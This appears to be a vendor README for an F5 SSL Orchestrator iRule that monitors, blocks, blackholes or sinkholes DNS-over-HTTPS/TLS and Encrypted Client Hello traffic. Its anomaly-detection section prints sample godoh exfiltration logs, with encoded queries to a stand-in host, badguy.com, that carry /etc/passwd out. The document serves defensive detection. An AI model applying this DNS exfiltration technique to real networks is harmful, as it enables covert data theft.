# SSL Orchestrator DoH Guardian Plus

DoH Guardian Plus is an F5 SSL Orchestrator pattern for monitoring and managing DNS-over-HTTPS (DoH), DNS-over-TLS (DoT), and Encrypted Client Hello (ECH) outbound traffic flows. This is an enhancement to the [DoH Guardian SSLO Service Extension](https://github.com/f5devcentral/sslo-service-extensions/tree/main/doh-guardian). Where the service extension only handles DNS-over-HTTPS (and ECH over DoH) traffic, this enhanced version now supports DoH and DoT traffic. The primary difference in the architecture is that this implementation sits directly on the main SSL Orchestrator outbound L3 topology virtual server, while the service extension sits inside the decrypted service chain.

Requires:
* BIG-IP SSL Orchestrator 17.1.x (SSLO 11.1) and higher
* Optional URLDB subscription -and/or- custom URL category (if categorization is required)

#### To implement

<ol>
  <li>Copy the iRule to the BIG-IP</li>
  <li>Add the new iRule to an (existing) SSL Orchestrator outbound L3 topology
    <ol type="a">
      <li>In the BIG-IP SSL Orchestrator UI, neavigate to the Interception Rules tab, then click on the corresponding topology interception rule that ends with "-in-t-4". Click to edit this interception rule and make sure "Show Advanced Settings" is clicked.</li>
      <li>At the bottom pf the page under **Resources**, add the new iRule into the *Selected* column. Click the **Save & Next** button and then re-deploy.</li>
    </ol>
  </li>
  <li>Ensure that the L3 outbound topology has APLN support disabled (SSL Configuration). As of BIG-IP 21.1 the implementation does not (yet) support DoH over HTTP2.
  </li>
</ol>

-----

#### To customize functionality

The iRule comes with a large number of control surfaces for managing DoH, DoT, and ECH traffic:

* **DOH_LOG_LOCAL**: <br />Enables or disables local (/var/log/ltm) logging of DoH requests and events. (1=on, 0=off, default 1)
* **DOH_LOG_HSL**: <br />Defines a high-speed logging pool to send logs to external SIEM. (pool name, default "none")
* **DOH_CATEGORY_TYPE**: <br />Defines the category database to use, "subscription", "custom_only", or "sub_and_custom". (string selection, default "subscription")
* **DOH_BLOCKING_BASIC**: <br />Enables or disables basic DoH blocking. This option is mutually exclusive and simply blocks all detected DoH requests. (1=on, 0=off, default 0)
* **DOH_BLACKHOLE_BY_CATEGORY_ACTION**: <br />Allows for the default "blackhole" action, or a "dryrun" (logging only) action. (string selection, default "dryrun")
* **DOH_BLACKHOLE_BY_CATEGORY**: <br />Defines the list of categories that will trigger a DoH blackhole action. (category list, default empty). Use the following command in the BIG-IP console/shell to get a list of categories:
    ```bash
    tmsh list sys url-db url-category |grep "sys url-db url-category " |awk -F" " '{print $4}'
    ```
* **DOH_SINKHOLE_BY_CATEGORY_ACTION**: <br />Allows for the default "sinkhole" action, or a "dryrun" (logging only) action. (string selection, default "dryrun")
* **DOH_SINKHOLE_BY_CATEGORY**: <br />Defines the list of categories that will trigger a DoH sinkhole action. (category list, default empty)
* **DOH_SINKHOLE_IP4**: <br />Defines the IP4v address that will be used for the sinkhole action on A requests. (ipv4 address string)
* **DOH_SINKHOLE_IP6**: <br />Defines the IP4v address that will be used for the sinkhole action on AAAA requests. (ipv6 address string)
* **ECH_BLOCK**: <br />Defines an action to take on a detected HTTPS record request. To prevent a TLS 1.3 encrypted client hello from happening, the client must not be able to retrieve the "ech" paramater from and HTTPS record request. This setting will either "block" the HTTPS record complete (return an empty response), strip the ech parameter from a DoH response ("echstrip"), leaving the rest of the HTTPS record response intact, or be disabled ("none"). (string selection, default "none")
* **DOH_ANOMALY_DETECTION**: <br />Enables or disables anomaly detection. (1=on, 0=off, default 0)
* **DOH_ANOMALY_CONDITION_LONG_DOMAIN**: <br />Defines the long subdomain anomaly detection, by virtue of a max character length setting (integer, default=52 characters). 
* **DOH_ANOMALY_CONDITION_LONG_DOMAIN_ACTION**: <br />Defines the action to be taken on the long subdomain anomaly: dryrun, drop, blackhole, or sinkhole. (string selection, default "dryrun")
* **DOH_ANOMALY_CONDITION_UNCOMMON_TYPE**: <br />Defines the uncommon query type anomaly detection, by virtue of a list of uncommon types. (DNS record type list)
* **DOH_ANOMALY_CONDITION_UNCOMMON_TYPE_ACTION**: <br />Defines the action to be take on the uncommon type anomaly: dryrun, drop, blackhole, or sinkhole. (string selection, default "NULL","NAPTR")

-----

#### Implementation details

<br />

<details>
<summary><b>DoH (and DoT) Inspection Explained</b></summary>

You may be asking, **why** do I need to inspect DNS-over-HTTPS and/or DNS-over-TLS traffic? DNS has been around longer than the web, and to be honest, you don't hear a lot about it with all of the other more exciting (and terrifying) security issues flying around. As it happens, though, DNS as a protocol is extremely flexible, making it very good at things like side-channel attacks and data exfiltration. In a scenario where an attacker can control a client on an enterprise network, and a DNS server out on the Internet, it becomes rather trivial for that attacker to move (exfiltrate) arbitrary data in the form of small chunks of encoded TXT records, or even dynamic subdomain names. However, as DNS itself is not encrypted, it's typically very easy to spot these anomalies. And most enterprises will implement local DNS forwarding, so data exfiltration over raw DNS is rarely successful. However...DNS-over-HTTPS (DoH) is essentially DNS wrapped in encrypted HTTPS for added security. The original intention for this is to provide privacy, but DoH has been found to possess some interesting drawbacks:

- The most popular browsers support DoH and DoT, and by default point their queries at Internet-based services like Cloudflare and Google. Where an enterprise once had full visibility of their DNS traffic, that is now absent unless you either set up local DoH services and modify all local browser clients to use this, or just block access to Cloudflare and Google DNS altogether. It is worth noting, though, that these are only two of thousands of DoH providers available.

- DoH rides on regular HTTPS, port 443, and is otherwise indistinguishable from regular HTTPS web traffic. It's not generally possible to simply "block DoH" unless you do so, either by known DoH URLs, or by decrypting it and inspecting the payloads.

- DoT rides on TCP port 853. It's easier to DoT (just block TCP port 853), but blocking will generally make the client revert back to DoH or raw DNS.

Unquestionably, DNS-over-HTTPS (and DNS-over-TLS) are an important privacy enhancement to DNS; but in doing so now obfuscates serious data leakage opportunities. DoH inspection is the explicit decryption of outbound HTTPS traffic and subsequent detection of the DoH requests and responses. This function allows an organization to regain visibility and control of DNS requests heading out to Internet DoH providers. From simple logging or blocking, to DNS blackhole and sinkhole actions, and some exfiltration anomaly detections, DoH inspection can be a vital part of the overall security of enterprise traffic flows.
</details>

<br />

<details>
<summary><b>DoH (and DoT) Anomaly Detection Explained</b></summary>

Before getting into the weeds of DoH/DoT anomaly detection, it's important to illustrate an actual exploit. There are many different tools for doing DoH/DoT exfiltration, but they all run on essentially the same basic principles: encoding chunks of data in multiple DNS requests. A compromised system inside the corporate network will make DNS-over-HTTPS queries to some public DoH service (ex. Cloudflare, Google, Quad9), which wlll forward those requests to a C2 DNS instance somewhere on the Internet. From the organization's perspective, this is just HTTPS traffic going to Cloudflare. The compromised client "agent" will periodically query the C2 instance, and when ready the C2 instance will issue a command in its response. We can look at a simple example from the **godoh** tool. In this case, the client agent makes successful contact with the C2 instance and sends periodic queries, waiting for commands:

```bash
DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
DoH TXT Query: name=6d73687836.badguy.com,type=16,version=JSON,id=null
```

This is a DNS **TXT** record request. At some point, the C2 instance will issue a command that it encodes in its TXT record response. The C2 server could, for example, say something like, "Give me your /etc/passwd file." The client agent will then go do the thing (get the local /etc/passwd file), break it into a bunch of small pieces, encode those pieces, and then send those pieces to the C2 instance as A record requests:

```bash
DoH A Query: name=d34a.be.0.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.be.0.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.1.4cf57533.0.3.1f8b08000000000002ff001f05e0fa6d49899cb2fc640f5204e16f8c9f37.090d121781de2b97925c886bde9e8a86f490b1651ed1bb585e31ffed9b3c.aff0c7a3598c1e2d5332335484b6dc41d33c7881b5a0a14d821e4338af56.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.1.4cf57533.0.3.1f8b08000000000002ff001f05e0fa6d49899cb2fc640f5204e16f8c9f37.090d121781de2b97925c886bde9e8a86f490b1651ed1bb585e31ffed9b3c.aff0c7a3598c1e2d5332335484b6dc41d33c7881b5a0a14d821e4338af56.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.12.a88ac3df.0.3.f943910ae0adcf7105990f3192c19236d04c0df22f897d91c3efec75f2d1.f9d26d1e218b77c6a28c9681391596f610ecbfac02f5b3bc5d5763b891c4.ea32f05d2bfc4eb65078835e0d8234f8b76bf20099e87b13305d14c23f98.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.13.bae530bc.0.3.047a8ba7091ff997b517777da8d59aefcefd0f263cf3ccb740ba5c848a53.25f6eecf8133876d2376abf317cb18239d17ac36432335d5ddbb75346fc4.e7d61353628401eba13398c19e4a1dd0f7d4f9a17d07e1f750aaba51285f.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.13.bae530bc.0.3.047a8ba7091ff997b517777da8d59aefcefd0f263cf3ccb740ba5c848a53.25f6eecf8133876d2376abf317cb18239d17ac36432335d5ddbb75346fc4.e7d61353628401eba13398c19e4a1dd0f7d4f9a17d07e1f750aaba51285f.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.14.87b9a653.0.3.dfb7c15f347f5bbb7ae0e716edf93cce77d4a5856de2c251554b38f4f237.dacf1716ba71620dba5345a01acfd849cc31872c12c0dff47919ccfdf0d3.e330811ce3a6a5fa1f198fff8fbce36c384778270ec6d31300a164ebd79f.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.14.87b9a653.0.3.dfb7c15f347f5bbb7ae0e716edf93cce77d4a5856de2c251554b38f4f237.dacf1716ba71620dba5345a01acfd849cc31872c12c0dff47919ccfdf0d3.e330811ce3a6a5fa1f198fff8fbce36c384778270ec6d31300a164ebd79f.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.15.53682df3.0.3.d455f8fd1fa1547fdef9eea4581fdabd4fb1b5418bd65a186f04a8d8a496.1e16f5b4a42bd4a4e4c852f045705ca321de5879176fd0a3671dbaf9e9ac.4dea784db392010000ffff7086b2021f050000.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ef.15.53682df3.0.3.d455f8fd1fa1547fdef9eea4581fdabd4fb1b5418bd65a186f04a8d8a496.1e16f5b4a42bd4a4e4c852f045705ca321de5879176fd0a3671dbaf9e9ac.4dea784db392010000ffff7086b2021f050000.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ca.16.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
DoH A Query: name=d34a.ca.16.00.0.0.0.0.0.badguy.com,type=1,version=JSON,id=null
```

And so, what looks like regular HTTPS traffic going to Cloudflare has just copied the contents of a sensitive system file to a bad actor on the Internet. There are a number of ways to "detect" anomalous DNS-over-HTTPS traffic, as documented in [Real time detection of malicious DoH traffic using statistical analysis](https://www.sciencedirect.com/science/article/pii/S1389128623003559). In this implementation we focus on two of these:

* **Abnormally long subdomain names**: where, as illustrated above, the full subdomain in a DoH exfiltration event will exceed some character length (default 52 characters).
* **Uncommon query types**: where the DoH agent uses an uncommon query type to convey messages (ex. NULL, NAPTR).
</details>

<br />

<details>
<summary><b>Encrypted Client Hello Explained</b></summary>

Defined in [RFC9849](https://datatracker.ietf.org/doc/rfc9849/), Encrypted Client Hello (ECH) is a new TLS1.3 extension that allows TLS to encrypt the Server Name Indication (SNI) in the Client Hello message. It defines separate "inner SNI" and "outer SNI" values, where the inner (real) SNI is encrypted with a shared symmetric key, and the outer SNI would usually point to a CDN. Only the endpoints can then see the real SNI, in this case the client and the CDN.

##### Technical Details
For a client to initiate a TLS1.3 ECH handshake:
1. The client must first make a DoH request for an **HTTPS** resource record. If the server supports ECH it will have pre-populated this resource record with a Hybrid Public Key Encryption (HPKE) public key. The HTTPS record is also designed to support additional parameters that can be used to speed up protocol negotiation. In the demo response below, the **alpn** value allows the browser to skip a connection attempt entirely and go straight to HTTP2 or HTTP3. The **ipv4hint** and **ipv6hint** parameters can be used by the browser in lieu of a separate A/AAAA query. And the **ech** parameter contains the HPKE public key that the client can use to encrypt the inner SNI in a TLS1.3 ECH handshake.

    ```text
    ;; ANSWER SECTION:
    test.site.	1800	IN	HTTPS	1 . alpn="h2,h3" ipv4hint="213.108.108.101" ipv6hint="2a00:c6c0:0:116:5::10" ech="base64-encoded-hpke-public-key..."
    ```
2. With successful retrieval of an HPKE public key, the client can then initiate a TLS1.3 ECH handshake with the endpoint, usually a CDN.

##### Challenges
The majority of browsers now support Encrypted Client Hello. While this is obviously a good thing for the reasons it was designed, it also imposes some significant security challenges:
- ECH presents an opportunity for a threat actor to hide C2 traffic inside legitimate connections to a CDN.
- Firewalls and other security middle boxes are effectely blind, losing critical visibility. This can also impact:
    - URL categorization and application ID
    - TLS SNI server load balancing

Given these challenges, organizations face a decision on whether or not to allow ECH through the firewall and potentially lose deep visibilty. A TLS1.3 ECH handshake is virtually indistinguishable from a non-ECH handshake, so if disabling ECH is required, the best method is simply to prevent the client from getting the HPKE in the first place. There are generally two options for doing this:
- Block DoH HTTPS record requests - In the iRule implementation this is a lightweight option that minimally requires parsing the DoH query. However blocking the entire HTTPS record request also potentially loses other helpful parameters.
- Strip the ech parameter from HTTPS record responses - In the iRule implementation this is a slightly heavier option that requires parsing the request *and* the response in order to remove the ech parameter if it exists.
</details>

<br />

<details>
<summary><b>DoH/DoT Blackhole Action Explained</b></summary>

By [definition](https://www.ijitee.org/wp-content/uploads/papers/v8i7c2/G10040587C219.pdf), a DNS blackhole essentially diverts a DNS client to *nothing*. A DNS blackhole will either drop the request entirely, or respond with an NXDOMAIN. However, a browser that fails in getting a DoH/DoT response will almost always retry with regular DNS, making this a less effective option for blocking queries. To properly blackhole a DoH/DoT request, the client must receive an actual response, but to something that does not exist. In this implementation, a DoH blackhole responds to the client with either a 199.199.199.199 IPv4 address for an A request, or 0:0:0:0:0:ffff:c7c7:c7c7 IPv6 address for a AAAA request.
</details>

<br />

<details>
<summary><b>DoH/DoT Sinkhole Action Explained</b></summary>

In a sinkhole response, the resolver sends back an IP address that points to a local blocking server. In contrast to a blackhole, a DNS sinkhole is diverting to *something*. The sinkhole destination is then able to respond to the client's request, so instead of just dying, the user might get a blocking page instead. In a DoH/DNS sinkhole without SSL Orchestrator, a client would initiate a TLS handshake to this server (believing it's the real site), and would get a certificate error because the server certificate on that blocking server doesn't match the Internet hostname requested by the client. The SSL Orchestrator solution requires two configurations:

* A sinkhole internal virtual server that simply hosts the "blank" certificate that SSL Orchestrator will use to mint a trusted server certificate to the client.
* An SSL Orchestrator outbound L3 topology modified to listen on the sinkhole destination IP and to inject the blocking response content.

To create the internal sinkhole configuration:

* **Optional easy-install step**: The following builds all of the necessary objects for the internal virtual server configuration.

  ```
  curl -s https://raw.githubusercontent.com/f5devcentral/sslo-script-tools/refs/heads/main/sslo-doh-guardian-plus/doh-create-sinkhole-internal-config.sh -o doh-create-sinkhole-internal-config.sh
  chmod +x doh-create-sinkhole-internal-config.sh

  export BIGUSER='admin:password'

  ./doh-create-sinkhole-internal-config.sh
  ```

* **Manual Step 1: Create the sinkhole certificate and key** The sinkhole certificate is specifically crafted to contain an empty Subject field. SSL Orchestrator is able to dynamically modify the subject-alternative-name field in the forged certificate, which is the only value of the two required by modern browsers.

  ```
  openssl req -x509 -newkey rsa:2048 -sha256 -days 3650 -nodes \
  -keyout "sinkhole.key" \
  -out "sinkhole.crt" \
  -subj "/" \
  -config <(printf "[req]\n
  distinguished_name=dn\n
  x509_extensions=v3_req\n
  [dn]\n\n
  [v3_req]\n
  keyUsage=critical,digitalSignature,keyEncipherment\n
  extendedKeyUsage=serverAuth,clientAuth")
  ```

* **Manual Step 2: Install the sinkhole certificate and key to the BIG-IP** Either manually install the new certificate and key to the BIG-IP, or use the following TMSH transaction:
  ```
  (echo create cli transaction
  echo install sys crypto key sinkhole-cert from-local-file "$(pwd)/sinkhole.key"
  echo install sys crypto cert sinkhole-cert from-local-file "$(pwd)/sinkhole.crt"
  echo submit cli transaction
  ) | tmsh
  ```

* **Manual Step 3: Create a client SSL profile that uses the sinkhole certificate and key** Either manually create a client SSL profile and bind the sinkhole certificate and key, or use the following TMSH command:
  ```
  tmsh create ltm profile client-ssl sinkhole-clientssl cert sinkhole-cert key sinkhole-cert > /dev/null
  ```

* **Manual Step 4: Create the sinkhole "internal" virtual server** This virtual server simply hosts the client SSL profile and sinkhole certificate that SSL Orchestrator will use to forge a blocking certificate.

  - Type: Standard
  - Source Address: 0.0.0.0/0
  - Destination Address/Mask: 0.0.0.0/0
  - Service Port: 9999 (does not really matter)
  - HTTP Profile (Client): http
  - SSL Profile (Client): the sinkhole client SSL profile
  - VLANs and Tunnel Traffic: select "Enabled on..." and leave the Selected box empty

  or use the following TMSH command:

  ```
  tmsh create ltm virtual sinkhole-internal-vip destination 0.0.0.0:9999 profiles replace-all-with { tcp http sinkhole-clientssl } vlans-enabled
  ```

* **Manual Step 5: Create the sinkhole target iRule** This iRule will be placed on the SSL Orchestrator topology to steer traffic to the sinkhole internal virtual server. Notice the contents of the HTTP_REQUEST event. This is the HTML blocking page content. Edit this at will to meet your local requriements.

  ```
  when CLIENT_ACCEPTED {
      virtual "sinkhole-internal-vip"
  }
  when CLIENTSSL_CLIENTHELLO priority 800 {
      if {[SSL::extensions exists -type 0]} {
          binary scan [SSL::extensions -type 0] @9a* SNI
      }
  
      if { [info exists SNI] } {
          SSL::forward_proxy extension 2.5.29.17 "critical,DNS:${SNI}"
      }
  }
  when HTTP_REQUEST {
      HTTP::respond 403 content "<html><head></head><body><h1>Site Blocked!</h1></body></html>"
  }
  ```

To create the SSL Orchestrator sinkhole listener topology. Any section not mentioned below can be skipped:

* **Topology Properties**

  - Protocol: TCP
  - SSL Orchestrator Topologies: select L3 Outbound

* **SSL Configuration**

  - Click on "Show Advanced Setting"
  - CA Certificate Key Chain: select the correct client-trusted internal signing CA certificate and key
  - Expire Certificate Response: Mask
  - Untrusted Certificate Response: Mask

* **Security Policy**

  - Delete the Pinners_Rule

* **Interception Rule**

  - Destination Address/Mask: enter the client-facing IP address/mask. This will be the address sent to clients from the DNS for the sinkhole. (ex. 10.1.10.160%0/32)
  - Ingress Network/VLANs: select the client-facing VLAN
  - Protocol Settings/SSL Configurations: ensure the previously-created SSL configuration is selected

Ignore all other settings and **Deploy**. Once deployed, navigate to the Interception Rules tab and edit the new sinkhole topology interception rule.

  - Resources/iRules: add the **sinkhole-target-rule** iRule

Ignore all other settings and **Deploy**.

<br />

To test the sinkhole action:

* Update the **DOH_SINHOLE_IP4** and/or **DOH_SINKHOLE_IP6** variables in the *doh-guardian-rule* to match the IP address applied to the sinkhole L3 SSL Orchestrator topology.
* Update the **DOH_SINKHOLE_BY_CATEGORY** variable in the *doh-guardian-rule to match a given category (ex. /Common/Entertainment).
* To test with a browser, ensure the browser is configured to use DNS-over-HTTPS to an Internet provider (Cloudflare, Google, etc.), then make a request to a site that will match the flagged category (ex. https://www.nbc.com).
  * For Chrome: Navigate to "chrome://settings/security", then enable the "Use secure DNS" option and select an appropriate DNS provider.
  * For Firefox: Navigate to Settings -> Provacy & Security
    * In the "Enable DNS over HTTPS using" section, select "Max Protection", and optionally provide a custom DNS provider (ex. https://cloudflare-dns.com/dns-query)
    * If the sinkhole IP address is on a local RFC1918 IP address, you may also need to enable this. Navigate to the "about:config" URL, search for "network.trr.allow-rfc1918", and set to "true".
* To test with command line curl, issue the following command, pointing to a URL that is matched by the flagged category:

  ```bash
  curl -vk --doh-insecure --doh-url https://cloudflare-dns.com/dns-query https://www.nbc.com
  ```
  *Note: The --doh-insecure command requires Curl 1.76.1 and higher*

  The result of both tests above should be the "Site Blocked!" page with a certificate forged by SSL Orchestrator. Injecting a static HTML response blocking page is just one option among many. You could, for example, issue a redirect instead of static HTML, and send the client to a more formal "splash page". This redirect could inject additional metadata to provide to the splash page. For example:

  ```
  when HTTP_REQUEST {
    HTTP::redirect "https://splash.f5labs.com/?cats=gis-dns-block&client_ip=[IP::client_addr]&type=dns&url=[URI::encode [b64encode [HTTP::host]]"
  }
  ```
</details>

<br />
